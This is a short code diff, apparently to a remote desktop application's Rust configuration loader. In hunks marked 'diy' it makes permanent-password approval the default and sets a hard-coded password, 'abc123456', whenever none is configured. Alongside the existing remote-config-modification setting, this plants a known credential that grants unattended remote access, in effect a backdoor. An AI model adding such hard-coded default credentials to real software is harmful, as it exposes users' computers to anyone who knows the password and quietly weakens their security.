@@ -477,6 +477,16 @@ impl Config2 {
             config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
             store = true;
             }
+        //diy
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+        //end diy
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -582,6 +592,12 @@ impl Config {
     fn load() -> Config {
         let mut config = Config::load_::<Config>("");
         let mut store = false;
+        //diy
+        if config.password.is_empty() {
+            config.password = "abc123456".to_string();
+            store = true;
+        }
+        //end diy
         let (password, _, store1) = decrypt_str_or_original(&config.password, PASSWORD_ENC_VERSION);
         config.password = password;
         store |= store1;
